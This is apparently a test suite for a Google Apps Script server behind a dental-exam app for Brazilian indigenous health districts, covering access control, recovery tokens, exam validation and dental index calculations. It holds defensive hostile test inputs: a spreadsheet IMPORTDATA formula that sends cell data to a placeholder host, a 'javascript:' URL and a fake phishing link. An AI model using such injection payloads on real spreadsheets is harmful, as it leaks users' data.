// Testes do servidor (Codigo.gs) no simulador do Apps Script. Rodam no computador (node testes/servidor.test.js)
// e no GitHub a cada envio. Não usam dados reais nem senhas reais: o cenário é montado do zero pelos fluxos do app.
const { cenario, exame } = require("./cenario.js");
let falhas = 0, total = 0, secao = "";
const T = (nome, cond, extra) => {
  total++;
  if (!cond) { falhas++; console.log("FALHA " + secao + " › " + nome + (extra === undefined ? "" : " → " + JSON.stringify(extra).slice(0, 400))); }
  else if (process.env.VERBOSO) console.log("ok    " + secao + " › " + nome);
};
const parte = n => { secao = n; };
const hojeBR = () => new Intl.DateTimeFormat("en-CA", { timeZone: "America/Sao_Paulo" }).format(new Date());
const amanhaBR = () => new Intl.DateTimeFormat("en-CA", { timeZone: "America/Sao_Paulo" }).format(new Date(Date.now() + 86400000));

const S = cenario();
const { G, P, C, RT, ANA, BRUNO, CARLA, BETO, PAULA } = S;
const aba = n => G.est.sheets[n] || [];
const col = (n, c) => aba(n)[0].indexOf(c);
const linhaEx = id => aba("Exames").find(l => l[0] === id);
const jsonEx = id => JSON.parse(linhaEx(id).at(-1));
const editouAMao = nome => G.ctx.onEdit({ range: { getSheet: () => ({ getName: () => nome }) } }); // o Google avisa cada edição feita na tela
const mailsPara = e => G.est.mails.filter(m => m.to === e);
const URL_OFICIAL = "https://luanabrisolla-creator.github.io/odontograma-v2/";
let r;

/* ---------------------------------------------------------------- instalação */
parte("instalação");
r = G.get();
T("servidor informa a versão", r.ok && typeof r.versao === "number" && r.versao >= 28, r.versao);
T("planilha vazia foi organizada sozinha no primeiro uso", G.ctx.formatoAtual(), G.est.props.FORMATO_PLANILHA);
T("abas principais na ordem", aba("Exames").length && G.est.order.slice(0, 5).join() === "Exames,Acessos,Uso,Usuarios,Dicionário" && !G.est.sheets.Dentes, G.est.order);
T("backup feito antes da organização", G.est.backups.length >= 1);

/* ---------------------------------------------------------------- cadastro e perfis */
parte("cadastro");
r = P(ANA, { acao: "entrar" });
T("dentista aprovada pela RT entra", r.ok && r.usuario.perfil === "dentista" && r.usuario.dsei === "Yanomami", r);
r = P(PAULA, { acao: "entrar" });
T("coordenação + RT entra como coord com DSEI", r.ok && r.usuario.perfil === "coord" && r.usuario.dsei === "Leste de Roraima", r.usuario);
r = P({ email: ANA.email, codigo: "ERRADO-0000-0000" }, { acao: "entrar" });
T("código errado é recusado", !r.ok && r.semAcesso);
r = P(null, { acao: "pedirAcesso", nome: "Novo", cro: "MT 1", email: "novo@teste.org", uf: "MT", dsei: "Xavante", perfil: "dentista" });
const idNovo = S.idDe("novo@teste.org");
r = P(RT, { acao: "aprovar", id: idNovo });
T("RT não aprova dentista de outro DSEI", !r.ok, r);
r = P(BETO, { acao: "aprovar", id: idNovo });
T("RT do DSEI aprova", r.ok, r);
r = P(null, { acao: "pedirAcesso", nome: "Zé", cro: "RR 1", email: "ze@teste.org", uf: "RR", dsei: "Teste" });
T("pedido com DSEI fora da lista é recusado", !r.ok);
r = P(null, { acao: "pedirAcesso", nome: "Zé", cro: "RR 1", email: "ze@teste.org", uf: "SP", dsei: "Yanomami" });
T("pedido com UF que não é do DSEI é recusado", !r.ok);

/* ---------------------------------------------------------------- planilha: fórmulas */
parte("planilha");
const nomeMau = '=IMPORTDATA("https://exemplo.invalido/?x="&A1)';
r = P(null, { acao: "pedirAcesso", nome: nomeMau, cro: "+5511", email: "formula@teste.org", uf: "RR", dsei: "Yanomami", polo: "@polo", perfil: "dentista" });
T("pedido de acesso com fórmula no nome é aceito como texto", r.ok, r);
const linhaF = aba("Usuarios").find(l => l[3] === "formula@teste.org");
T("nome, CRO e polo gravados com proteção (sem virar fórmula)", G.est.formulas.length === 0 && linhaF[1] === "'" + nomeMau, G.est.formulas.slice(0, 3));
const lido = G.ctx.lerUsuarios().find(u => u.email === "formula@teste.org");
T("ao ler, o nome volta igual ao digitado", lido && lido.nome === nomeMau && lido.cro === "+5511", lido && lido.nome);

/* ---------------------------------------------------------------- e-mails usam o endereço oficial */
parte("endereço dos e-mails");
const ruim = "https://site-falso.invalido/";
let n0 = G.est.mails.length;
r = G.post({ acao: "reenviarCodigo", email: ANA.email, link: ruim });
let m = G.est.mails.slice(n0).find(x => x.to === ANA.email);
T("recuperação: o link do e-mail é o oficial, mesmo se o navegador mandar outro", r.ok && m && m.body.includes(URL_OFICIAL + "?recuperar=") && !m.body.includes("site-falso"), m && m.body);
n0 = G.est.mails.length;
r = G.post({ acao: "pedirAcesso", nome: "Fulana", cro: "RR 9", email: "fulana@teste.org", uf: "RR", dsei: "Yanomami", perfil: "dentista", link: ruim });
const avisos = G.est.mails.slice(n0);
T("pedido de acesso: o aviso para a RT leva o endereço oficial", avisos.length && avisos.every(x => !x.body.includes("site-falso")) && avisos.some(x => x.body.includes(URL_OFICIAL)), avisos.map(x => x.body.slice(0, 200)));
n0 = G.est.mails.length;
r = P(RT, { acao: "convidar", perfil: "dentista", emails: "convidada@teste.org", link: ruim });
m = G.est.mails.slice(n0).find(x => x.to === "convidada@teste.org");
T("convite: o link é o oficial", r.ok && m && m.body.includes(URL_OFICIAL + "?convite=") && !m.body.includes("site-falso") && r.resultados[0].link.startsWith(URL_OFICIAL), m && m.body);
n0 = G.est.mails.length;
r = P(RT, { acao: "aprovar", id: S.idDe("fulana@teste.org"), link: ruim });
m = G.est.mails.slice(n0).find(x => x.to === "fulana@teste.org");
T("aprovação: o e-mail com o código leva o endereço oficial", r.ok && m && m.body.includes(URL_OFICIAL) && !m.body.includes("site-falso"), m && m.body);
G.est.props.URL_APP = "https://odontograma.exemplo.org/app";
n0 = G.est.mails.length;
P(RT, { acao: "convidar", perfil: "dentista", emails: "outra@teste.org", link: ruim });
m = G.est.mails.slice(n0).find(x => x.to === "outra@teste.org");
T("endereço configurável em Propriedades do script (URL_APP)", m && m.body.includes("https://odontograma.exemplo.org/app/?convite="), m && m.body);
G.est.props.URL_APP = "javascript:alert(1)";
T("URL_APP inválida volta para o endereço oficial", G.ctx.urlApp() === URL_OFICIAL);
delete G.est.props.URL_APP;

/* ---------------------------------------------------------------- convite até o fim */
parte("convites");
const tokConv = (mailsPara("convidada@teste.org").at(-1).body.match(/convite=([0-9a-f]+)/) || [])[1];
r = G.post({ acao: "verConvite", convite: tokConv });
T("convite válido é reconhecido", r.ok && r.convite.dsei === "Yanomami", r);
r = G.post({ acao: "aceitarConvite", convite: tokConv, nome: "Convidada", cro: "RR 55", uf: "SP" });
T("aceitar com UF de fora do DSEI é recusado", !r.ok, r);
r = G.post({ acao: "aceitarConvite", convite: tokConv, nome: "Convidada", cro: "RR 55", uf: "RR" });
T("aceitar o convite cria acesso ativo", r.ok && r.usuario && r.usuario.status === "ativo", r);
r = G.post({ acao: "aceitarConvite", convite: tokConv, nome: "Convidada", cro: "RR 55", uf: "RR" });
T("o mesmo convite não serve duas vezes", !r.ok);

/* ---------------------------------------------------------------- recuperação de código */
parte("recuperação");
const pedirRec = e => { G.post({ acao: "reenviarCodigo", email: e }); return (mailsPara(e).at(-1).body.match(/recuperar=([0-9a-f]+)/) || [])[1]; };
const tokB = pedirRec(BRUNO.email);
T("o pedido não troca o código: o antigo continua valendo", P(BRUNO, { acao: "entrar" }).ok);
r = G.post({ acao: "confirmarRecuperacao", recuperar: "abcdef0123456789abcdef" });
T("link inventado é recusado", !r.ok);
r = G.post({ acao: "confirmarRecuperacao", recuperar: tokB });
T("confirmar gera o código novo e mostra na tela", r.ok && /^[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}$/.test(r.codigo), r);
const novoB = r.codigo;
T("depois de confirmar, o código antigo para de valer", !P(BRUNO, { acao: "entrar" }).ok);
BRUNO.codigo = novoB;
T("o código novo vale", P(BRUNO, { acao: "entrar" }).ok);
T("o código novo também vai por e-mail", mailsPara(BRUNO.email).some(x => x.body.includes(novoB)));
T("link já usado não serve de novo", !G.post({ acao: "confirmarRecuperacao", recuperar: tokB }).ok);
const tokV = pedirRec(BRUNO.email);
aba("_recuperacoes").forEach((l, i) => { if (i) l[4] = "2020-01-01T00:00:00.000Z"; });
r = G.post({ acao: "confirmarRecuperacao", recuperar: tokV });
T("link vencido é recusado", !r.ok && /expirou/.test(r.erro), r);
G.post({ acao: "reenviarCodigo", email: BRUNO.email });
r = G.post({ acao: "reenviarCodigo", email: BRUNO.email });
T("no máximo 3 pedidos por hora por e-mail", !r.ok && /hora/.test(r.erro), r);
n0 = G.est.mails.length;
r = G.post({ acao: "reenviarCodigo", email: "ninguem@teste.org" });
T("e-mail sem acesso: mesma resposta e nenhum e-mail enviado", r.ok && G.est.mails.length === n0);

/* ---------------------------------------------------------------- limite de tentativas */
parte("login");
for (let i = 0; i < 21; i++) P({ email: CARLA.email, codigo: "ERRADO-" + i }, { acao: "entrar" });
r = P({ email: CARLA.email, codigo: "ERRADO-X" }, { acao: "entrar" });
T("depois de 20 erros, as tentativas erradas recebem 'bloqueado'", !r.ok && r.bloqueado, r);
r = P(CARLA, { acao: "entrar" });
T("profissional com o código certo entra mesmo depois de 20 erros de outra pessoa", r.ok, r);
r = P({ email: CARLA.email, codigo: "ERRADO-Y" }, { acao: "entrar" });
T("entrar zera o contador de erros", !r.ok && !r.bloqueado, r);
for (let i = 0; i < 21; i++) P({ email: C.email, codigo: "errada-" + i }, { acao: "entrar" });
r = P(C, { acao: "entrar" });
T("coordenação titular: bloqueio vale até para a senha certa (senha escolhida por pessoa)", !r.ok && r.bloqueado, r);
Object.keys(G.est.cache).forEach(k => { if (k.includes(C.email)) G.est.cache[k].exp = 0; });
T("titular volta a entrar depois do tempo", P(C, { acao: "entrar" }).ok);
G.est.props.CHAVE_COORDENACAO = "curta123";
r = P({ email: C.email, codigo: "curta123" }, { acao: "admin" });
T("senha da titular com menos de 12 caracteres não entra, e a mensagem diz como resolver", !r.ok && /pelo menos 12 caracteres/.test(r.erro) && /Propriedades do script/.test(r.erro), r);
G.est.props.CHAVE_COORDENACAO = S.SENHA_TITULAR;
T("senha longa: sem aviso", P(C, { acao: "admin" }).senhaCurta === false);

/* ---------------------------------------------------------------- corrida no login */
parte("concorrência");
// Simula: a RT desativa a Ana no mesmo instante em que o app dela faz o primeiro acesso do dia.
const realLer = G.ctx.lerUsuarios;
const linhaAna = aba("Usuarios").findIndex(l => l[3] === ANA.email);
aba("Usuarios")[linhaAna][col("Usuarios", "ultimo_acesso")] = "2020-01-01T00:00:00.000Z";
editouAMao("Usuarios"); G.ctx.cadastrosMudaram(); // mexemos na planilha "à mão": o Google avisa e a cópia rápida é esquecida
const fotoAntiga = realLer();
aba("Usuarios")[linhaAna][col("Usuarios", "status")] = "desativado";
G.ctx.lerUsuarios = () => JSON.parse(JSON.stringify(fotoAntiga));
P(ANA, { acao: "painel" });
G.ctx.lerUsuarios = realLer;
T("o login atrasado grava só o último acesso e não desfaz a desativação", aba("Usuarios")[linhaAna][col("Usuarios", "status")] === "desativado" && aba("Usuarios")[linhaAna][col("Usuarios", "ultimo_acesso")] > "2026", aba("Usuarios")[linhaAna]);
aba("Usuarios")[linhaAna][col("Usuarios", "status")] = "ativo";

/* ---------------------------------------------------------------- exames: validação */
parte("validação do exame");
const tenta = (nome, mexe, re, cred) => {
  const e = exame(); mexe(e); const n = aba("Exames").length;
  const x = P(cred || ANA, { acao: "enviarExame", registro: e });
  T("recusa: " + nome, !x.ok && re.test(x.erro || "") && aba("Exames").length === n, x.erro || x);
};
r = P(ANA, { acao: "enviarExame", registro: exame({ id: "OK1", sufixo: "KAAAAAA2" }) });
T("exame completo é gravado", r.ok && linhaEx("OK1"), r);
tenta("sem sexo (\"Não informado\")", e => { e.crianca.sexo = ""; }, /sexo/);
tenta("sexo fora de F/M", e => { e.crianca.sexo = "NI"; }, /sexo/);
tenta("sem local de atendimento", e => { e.localAtendimento = ""; }, /local/);
tenta("sem vigilância", e => { e.vigilancia = []; }, /vigilância/);
tenta("vigilância com item fora da lista", e => { e.vigilancia = ["Coisa inventada"]; }, /vigilância/);
r = P(ANA, { acao: "enviarExame", registro: exame({ id: "VIGN", sufixo: "VGNVGNV2", vig: ["Não identificado", "Dor de dente", "Traumatismo dentoalveolar"] }) });
T("vigilância: \"Não identificado\" junto com outro item e \"Dor de dente\" sem dente com dor são corrigidos pelo servidor", r.ok && jsonEx("VIGN").vigilancia.join("|") === "Traumatismo dentoalveolar", r.ok ? jsonEx("VIGN").vigilancia : r);
tenta("placa sem resposta", e => { e.placa = null; }, /placa/);
tenta("gengivite como texto", e => { e.gengivite = "sim"; }, /gengivite/);
tenta("data impossível (31/02)", e => { e.dataExame = "2026-02-31"; }, /data do exame/);
tenta("exame de amanhã", e => { e.dataExame = amanhaBR(); }, /futuro/);
tenta("nascimento impossível", e => { e.crianca.nascimento = "2019-04-31"; }, /nascimento/);
tenta("nascimento depois do exame", e => { e.crianca.nascimento = "2026-12-01"; }, /nascimento/);
tenta("dentição inválida", e => { e.denticao = "outra"; }, /dentição/);
tenta("UF que não é do DSEI", e => { e.uf = "SP"; }, /UF/);
tenta("odontograma incompleto (faltando dentes)", e => { delete e.dentes[36]; delete e.dentes[55]; }, /incompleto/);
tenta("dente fora da dentição", e => { e.dentes[99] = e.dentes[11]; }, /fora da dentição/);
tenta("situação antiga \"a confirmar\"", e => { e.dentes[16].status = "a_confirmar"; }, /situação/);
tenta("situação antiga \"raiz residual\"", e => { e.dentes[16].status = "raiz"; }, /situação/);
tenta("situação antiga \"extração indicada\"", e => { e.dentes[16].status = "extr_ind"; }, /situação/);
tenta("esfoliado em dente permanente", e => { e.dentes[16].status = "esfoliado"; }, /situação/);
tenta("face marcada em dente que não está presente", e => { e.dentes[36].status = "ausente_carie"; e.dentes[36].faces.O = "ca"; }, /situação ou faces/);
tenta("tratamento em dente ausente", e => { e.dentes[36].status = "ausente"; e.dentes[36].procs = { art: "indicado" }; }, /tratamento/);
tenta("dor em dente não erupcionado", e => { e.dentes[17].status = "nao_erupc"; e.dentes[17].dor = true; }, /sinais/);
tenta("as duas exodontias no mesmo dente", e => { e.dentes[46].procs = { exo_carie: "indicado", exodontia: "indicado" }; }, /tratamento/);
tenta("abscesso como texto", e => { e.dentes[16].abscesso = "sim"; }, /sinais/);
tenta("prótese com resposta faltando", e => { e.protese = { sup: "nao", inf: "sim", usoSup: "nao", usoInf: "", naoAvaliado: false }; }, /prótese/);
tenta("prótese sem nenhuma resposta e sem \"não foi possível avaliar\"", e => { e.protese = { sup: "", inf: "", usoSup: "", usoInf: "" }; }, /prótese/);
tenta("prótese com valor inválido", e => { e.protese = { sup: "talvez", inf: "nao", usoSup: "nao", usoInf: "nao" }; }, /prótese/);
tenta("face com situação desconhecida", e => { e.dentes[16].faces.O = "xyz"; }, /situação/);
tenta("dor como texto", e => { e.dentes[16].dor = "sim"; }, /sinais/);
tenta("procedimento inexistente", e => { e.dentes[16].procs = { inventado: "realizado" }; }, /tratamento/);
tenta("procedimento com valor inválido", e => { e.dentes[16].procs = { selante: "feito" }; }, /tratamento/);
tenta("procedimento coletivo fora da lista", e => { e.gerais = ["Coisa inventada"]; }, /coletivos/);
tenta("insumo fora da lista", e => { e.insumos = ["Bala"]; }, /insumos/);
tenta("código de acompanhamento fora do formato", e => { e.codigo = e.codigoIndividuo = "QUALQUER-COISA"; }, /formato/);
tenta("código com a UF de outro DSEI", e => { e.codigo = e.codigoIndividuo = "SP-SUR-SAU-ABCDEFGH"; }, /UF do DSEI/);
r = P(ANA, { acao: "enviarExame", registro: exame({ id: "OK2", sufixo: "KBBBBBB2", data: hojeBR(), gerais: ["Escovação supervisionada"], insumos: ["Escova dental"], mud: { 16: { procs: { selante: "realizado", verniz: "indicado" } } } }) });
T("exame de hoje, com procedimentos, coletivos e insumos válidos, passa", r.ok, r);
tenta("código no formato antigo (UF-polo-aldeia-CRO-sequência)", e => { e.codigo = e.codigoIndividuo = "RR-SUR-SAU-4471-0007"; }, /formato/);
tenta("código com a parte do polo vazia", e => { e.codigo = e.codigoIndividuo = "RR--SAU-KCCCCCC2"; }, /formato/);
tenta("código com mais de 3 caracteres na aldeia", e => { e.codigo = e.codigoIndividuo = "RR-SUR-SAUB-KCCCCCC2"; }, /formato/);
T("reserva também recusa parte vazia", !P(ANA, { acao: "reservarCodigo", codigoReserva: "RR-SUR--KCCCCCC2", exameId: "RVZ" }).ok);
T("planilha: código que bate com o local do exame → codigo_confere_local = sim", linhaEx("OK1")[col("Exames", "codigo_confere_local")] === "sim", linhaEx("OK1")[col("Exames", "codigo_confere_local")]);
r = P(ANA, { acao: "enviarExame", registro: exame({ id: "OKLOC", codigo: "RR-SUR-HAK-KDDDDDD2", aldeia: "Saúba" }) });
T("código que não bate com a aldeia do exame é aceito, mas sinalizado (codigo_confere_local = não)", r.ok && linhaEx("OKLOC")[col("Exames", "codigo_confere_local")] === "não", r);
T("o dicionário da planilha explica a coluna codigo_confere_local", aba("Dicionário").some(l => l[1] === "codigo_confere_local") || Object.keys(G.est.sheets).some(n => /icion/.test(n) && G.est.sheets[n].some(l => l.includes("codigo_confere_local"))));

/* ---------------------------------------------------------------- exames: DSEI */
parte("DSEI");
tenta("CD manda exame de outro DSEI", e => { e.dsei = "Leste de Roraima"; }, /DSEI Yanomami/);
tenta("RT manda exame de outro DSEI", e => { e.dsei = "Yanomami"; e.uf = "RR"; }, /DSEI Xavante/, BETO);
tenta("coordenação + RT manda exame fora do DSEI de RT", e => { e.dsei = "Yanomami"; }, /Leste de Roraima/, PAULA);
r = P(PAULA, { acao: "enviarExame", registro: exame({ id: "PAULA1", dsei: "Leste de Roraima", sufixo: "PAVXAAA2", aldeia: "Maturuca", polo: "Surumu" }) });
T("coordenação + RT grava no próprio DSEI de RT", r.ok, r);
T("coordenação titular não registra exame", !P(C, { acao: "enviarExame", registro: exame({ dsei: "Yanomami" }) }).ok);

/* ---------------------------------------------------------------- resultado calculado no servidor */
parte("índices");
// 16, 26: exodontia devido à cárie (permanente) → C. 36: extraído por cárie → P. 46: cárie + restauração → C (uma vez).
// 55, 64: exodontia devido à cárie (decíduo) → e. 54: decíduo extraído por cárie → não conta. 53: esfoliado → não conta.
// 75: restaurada + mancha branca → o. 85: exodontia por outros motivos → não conta.
const fr = exame({ id: "IDX1", sufixo: "NDCESAB2", mud: { 16: { procs: { exo_carie: "indicado" } }, 26: { procs: { exo_carie: "realizado" }, faces: { O: "ca" } }, 36: { status: "ausente_carie" },
  46: { faces: { O: "ca", M: "rest" } }, 55: { procs: { exo_carie: "indicado" }, faces: { O: "ca" } }, 64: { procs: { exo_carie: "realizado" } }, 54: { status: "ausente_carie" }, 53: { status: "esfoliado" },
  75: { faces: { O: "rest", V: "mba" } }, 85: { procs: { exodontia: "indicado" } } } });
fr.resultado = { classe: "A", ceod: { c: 0, e: 0, o: 0, total: 0 }, cpod: { c: 0, p: 0, o: 0, total: 0 } };
r = P(ANA, { acao: "enviarExame", registro: fr });
const g = r.ok ? jsonEx("IDX1").resultado : { ceod: {}, cpod: {} };
T("o servidor ignora a classe mandada pelo navegador", r.ok && g.classe === "E", r.ok ? g.classe : r);
T("CPO-D: exodontia devido à cárie (indicada ou realizada) conta como C, uma vez por dente", g.cpod.c === 3, g.cpod);
T("CPO-D: só o extraído por cárie entra em P", g.cpod.p === 1 && g.cpod.total === 4, g.cpod);
T("ceo-d: exodontia devido à cárie (indicada ou realizada) entra em e, uma vez por dente", g.ceod.e === 2 && g.ceod.c === 0, g.ceod);
T("ceo-d: decíduo extraído por cárie, esfoliado e exodontia por outros motivos não contam", g.ceod.total === 3, g.ceod);
T("ceo-d: mancha branca com restauração conta como o", g.ceod.o === 1, g.ceod);
// Arquivo de análise (uma linha por exame, com cada dente): montado a partir do exame completo gravado.
const an = id => { const l = G.ctx.linhaAnalise(jsonEx(id)), o = {}; G.ctx.CAB_ANALISE.forEach((k, i) => o[k] = l[i]); return o; };
const a1 = r.ok ? an("IDX1") : {};
T("análise: dente esfoliado aparece como esfoliado, sem faces", a1.d53_situacao === "esfoliado" && a1.d53_face_I === "", [a1.d53_situacao, a1.d53_face_I]);
T("análise: exodontia devido à cárie em tratamento indicado do dente", a1.d16_trat_indicado === "Exodontia devido à cárie", a1.d16_trat_indicado);
T("análise: face restaurada aparece como \"restaurada sem cárie\"", a1.d46_face_M === "restaurada sem cárie" && a1.d46_face_O === "cárie ativa", [a1.d46_face_M, a1.d46_face_O]);
T("análise: contas prontas batem com os dentes", a1.n_exo_carie_indicado === 2 && a1.n_exo_carie_realizado === 2 && a1.n_dentes_extraidos_carie === 2 && a1.n_dentes_esfoliados === 1, [a1.n_exo_carie_indicado, a1.n_exo_carie_realizado, a1.n_dentes_extraidos_carie]);
T("análise: faces L ou P conforme a arcada e O ou I conforme o dente", "d16_face_P" in a1 && "d46_face_L" in a1 && "d11_face_I" in a1 && "d55_face_P" in a1 && "d85_face_L" in a1);
T("planilha: uma linha por exame (sem aba Dentes) e contas prontas nas colunas", !G.est.sheets.Dentes && linhaEx("IDX1")[col("Exames", "n_exo_carie_indicado")] === 2, linhaEx("IDX1")[col("Exames", "n_exo_carie_indicado")]);
// Dor e abscesso separados; a vigilância vem dos dentes (o servidor confere).
const fx = exame({ id: "IDX2", sufixo: "NDCESAB3", vig: ["Não identificado"], mud: { 46: { dor: true }, 36: { abscesso: true } } });
r = P(ANA, { acao: "enviarExame", registro: fx });
const jx = r.ok ? jsonEx("IDX2") : {};
T("dor e abscesso no dente levam à classe F", r.ok && jx.resultado.classe === "F", r.ok ? jx.resultado : r);
T("a vigilância gravada traz \"Dor de dente\" e \"Abscesso dentoalveolar\" vindos dos dentes, sem \"Não identificado\"", r.ok && jx.vigilancia.join("|") === "Dor de dente|Abscesso dentoalveolar", jx.vigilancia);
const a2 = r.ok ? an("IDX2") : {};
T("análise: dor e abscesso separados em cada dente", a2.d46_dor === "sim" && a2.d46_abscesso === "não" && a2.d36_abscesso === "sim" && a2.n_dentes_dor === 1 && a2.n_dentes_abscesso_fistula === 1, [a2.d46_dor, a2.d46_abscesso, a2.d36_abscesso]);
r = P(ANA, { acao: "enviarExame", registro: exame({ id: "IDX3", sufixo: "NDCESAB4", protese: { sup: "", inf: "", usoSup: "", usoInf: "", naoAvaliado: true } }) });
T("prótese \"não foi possível avaliar\" é aceita e vai como Não avaliado", r.ok && linhaEx("IDX3")[col("Exames", "protese_sup_usa")] === "não avaliado" && linhaEx("IDX3")[col("Exames", "protese_inf_necessita")] === "não avaliado", r);
r = P(ANA, { acao: "enviarExame", registro: exame({ id: "IDX4", sufixo: "NDCESAB5", protese: { sup: "sim", inf: "nao", usoSup: "nao", usoInf: "sim", naoAvaliado: false } }) });
T("prótese: necessidade e uso por arcada nas colunas certas", r.ok && linhaEx("IDX4")[col("Exames", "protese_sup_necessita")] === "sim" && linhaEx("IDX4")[col("Exames", "protese_sup_usa")] === "não" && linhaEx("IDX4")[col("Exames", "protese_inf_usa")] === "sim", r);
T("divergência de classe registrada nos Acessos", aba("Acessos").some(l => l[7] === "Resultado recalculado"));

/* ---------------------------------------------------------------- código de acompanhamento */
parte("código");
r = P(ANA, { acao: "reservarCodigo", codigoReserva: "RR-SUR-HAK-RESERVA2", exameId: "RES1" });
T("reserva um código livre", r.ok && r.reservado, r);
r = P(BRUNO, { acao: "reservarCodigo", codigoReserva: "RR-SUR-HAK-RESERVA2", exameId: "RES2" });
T("outro aparelho não recebe o mesmo código", r.ok && r.ocupado, r);
r = P(BRUNO, { acao: "reservarCodigo", codigoReserva: "RR-SUR-SAU-KAAAAAA2", exameId: "RES3" });
T("código já usado por uma pessoa não é reservado", r.ok && r.ocupado, r);
r = P(BRUNO, { acao: "enviarExame", registro: exame({ id: "COL1", codigo: "RR-SUR-SAU-KAAAAAA2" }) });
T("código repetido no envio: recusado, sem '-2' e sem juntar pessoas", !r.ok && r.codigoRepetido && !linhaEx("COL1"), r);
r = P(BRUNO, { acao: "enviarExame", registro: exame({ id: "COL2", codigo: "RR-SUR-HAK-RESERVA2" }) });
T("código reservado por outro exame: recusado", !r.ok && r.codigoRepetido, r);

/* ---------------------------------------------------------------- mesma pessoa, buscas e histórico */
parte("acompanhamento");
const seg = exame({ id: "OK1-B", data: "2026-10-15", vinculo: { codigoIndividuo: "RR-SUR-SAU-KAAAAAA2", chaves: [] } });
r = P(BRUNO, { acao: "enviarExame", registro: seg });
T("2º exame da mesma pessoa, por outro dentista do DSEI", r.ok && r.numeroExame === 2 && r.codigoIndividuo === "RR-SUR-SAU-KAAAAAA2", r);
r = P(BRUNO, { acao: "buscarCodigo", codigoBusca: "rr-sur-sau-kaaaaaa2", dsei: "Yanomami" });
T("busca pelo código acha a pessoa", r.ok && r.pessoa && r.pessoa.exames === 2, r);
r = P(CARLA, { acao: "buscarCodigo", codigoBusca: "RR-SUR-SAU-KAAAAAA2", dsei: "Yanomami" });
T("CD de outro DSEI não escolhe o DSEI da busca", r.ok && !r.pessoa && r.foraDoDsei === "Leste de Roraima", r);
r = P(CARLA, { acao: "buscarCodigo", codigoBusca: "RR-SUR-SAU-KAAAAAA2", dsei: "Leste de Roraima" });
T("para CD, código de outro DSEI é só 'não localizado no seu DSEI'", r.ok && !r.pessoa && !r.outroDsei && r.foraDoSeuDsei, r);
r = P(C, { acao: "buscarCodigo", codigoBusca: "RR-SUR-SAU-KAAAAAA2", dsei: "Leste de Roraima" });
T("a coordenação vê qual é o DSEI do código", r.ok && r.outroDsei === "Yanomami", r);
r = P(BRUNO, { acao: "buscarPessoa", dsei: "Yanomami", aldeia: "Hakoma", nascimento: "2018-05-12", sexo: "F" });
T("busca sem código sugere pessoa de outra aldeia do DSEI, marcada", r.ok && r.outrasAldeias && r.candidatos.length && r.candidatos.every(c => c.outraAldeia), r.candidatos && r.candidatos.map(c => c.outraAldeia));
T("histórico: dentista do mesmo DSEI vê (continuidade do cuidado)", P(BRUNO, { acao: "pessoa", codigoIndividuo: "RR-SUR-SAU-KAAAAAA2" }).ok);
T("histórico: dentista de outro DSEI não vê", !P(CARLA, { acao: "pessoa", codigoIndividuo: "RR-SUR-SAU-KAAAAAA2" }).ok);
T("histórico: RT de outro DSEI não vê", !P(BETO, { acao: "pessoa", codigoIndividuo: "RR-SUR-SAU-KAAAAAA2" }).ok);
T("histórico: coordenação vê", P(C, { acao: "pessoa", codigoIndividuo: "RR-SUR-SAU-KAAAAAA2" }).ok);

/* ---------------------------------------------------------------- código em mais de um DSEI (defesa) */
parte("código em dois DSEIs");
r = P(ANA, { acao: "enviarExame", registro: exame({ id: "MD1", sufixo: "MDMDMDM2" }) });
r = P(BRUNO, { acao: "enviarExame", registro: exame({ id: "MD2", data: "2026-10-12", vinculo: { codigoIndividuo: "RR-SUR-SAU-MDMDMDM2", chaves: [] } }) });
T("pessoa com dois exames no mesmo DSEI", r.ok && r.numeroExame === 2, r);
// Simula um dado corrompido: um dos exames aparece em outro DSEI na planilha.
(() => { const l = linhaEx("MD2"), j = JSON.parse(l.at(-1)); j.dsei = "Leste de Roraima"; l[col("Exames", "dsei")] = "Leste de Roraima"; l[l.length - 1] = JSON.stringify(j); })();
editouAMao("Exames");
const mails0 = mailsPara("coord@teste.org").length;
r = P(BRUNO, { acao: "pessoa", codigoIndividuo: "RR-SUR-SAU-MDMDMDM2" });
T("CD do DSEI não vê o histórico de código com exames em dois DSEIs", !r.ok, r);
T("fica registrado em Acessos como Segurança", aba("Acessos").some(l => l[7] === "Código em mais de um DSEI" && l[6] === "Segurança"));
T("a coordenação recebe um e-mail de aviso", mailsPara("coord@teste.org").length === mails0 + 1 && /mais de um DSEI/.test(mailsPara("coord@teste.org").at(-1).subject), mailsPara("coord@teste.org").length - mails0);
r = P(ANA, { acao: "buscarCodigo", codigoBusca: "RR-SUR-SAU-MDMDMDM2", dsei: "Yanomami" });
T("a busca pelo código não devolve a pessoa para CD", r.ok && !r.pessoa && r.foraDoSeuDsei, r);
T("nova tentativa não manda outro e-mail (no máximo um aviso a cada 6 h)", mailsPara("coord@teste.org").length === mails0 + 1);
r = P(C, { acao: "pessoa", codigoIndividuo: "RR-SUR-SAU-MDMDMDM2" });
T("a coordenação continua vendo, para corrigir", r.ok && r.exames.length === 2, r);
r = P(C, { acao: "buscarCodigo", codigoBusca: "RR-SUR-SAU-MDMDMDM2", dsei: "Yanomami" });
T("para a coordenação, a busca diz que o código está em conferência", r.ok && r.emConferencia && /Leste de Roraima/.test(r.outroDsei), r);
r = P(ANA, { acao: "enviarExame", registro: exame({ id: "MD3", data: "2026-10-14", vinculo: { codigoIndividuo: "RR-SUR-SAU-MDMDMDM2", chaves: [] } }) });
T("não dá para juntar novo exame a esse código", !r.ok && r.vinculoInvalido && !linhaEx("MD3"), r);
const md2 = Object.assign(exame({ id: "MD2", data: "2026-10-12", vinculo: { codigoIndividuo: "RR-SUR-SAU-MDMDMDM2", chaves: [] } }), { atualizadoEm: "2026-10-20T12:00:00.000Z" });
r = P(BRUNO, { acao: "enviarExame", registro: md2 });
T("exame gravado num DSEI não pode ser reenviado como de outro DSEI", !r.ok && r.dseiInvalido && linhaEx("MD2")[col("Exames", "dsei")] === "Leste de Roraima", r);

/* ---------------------------------------------------------------- painel */
parte("painel");
for (let i = 0; i < 6; i++) P(BRUNO, { acao: "enviarExame", registro: exame({ id: "PN" + i, sufixo: "PANEX" + "ABCDEF"[i] + "22", nasc: "2016-0" + (i + 1) + "-10", idade: 10, mud: i < 3 ? { 46: { faces: { O: "ca" } } } : {} }) });
r = P(C, { acao: "painel" });
T("painel geral responde", r.ok && r.resumo && r.resumo.n > 0, r.erro);
T("uma pessoa com 2 exames conta uma vez; exames contam todos", r.resumo.nExames > r.resumo.n, [r.resumo.n, r.resumo.nExames]);
